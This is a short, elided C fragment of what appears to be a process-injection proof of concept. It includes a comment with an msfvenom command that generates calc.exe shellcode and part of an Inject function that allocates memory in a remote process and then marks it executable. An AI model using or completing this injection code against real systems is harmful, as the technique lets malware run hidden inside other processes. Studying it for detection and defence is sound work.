...
//calc payload
//msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -a x64 -f hex
...
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len)
 {
        ...
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_READWRITE);
        if(pRemoteCode)
        {
        ...
        if (!VirtualProtectEx(hProc, pRemoteCode, (SIZE_T)payload_len, PAGE_EXECUTE_READ, &oldProtect))
        {
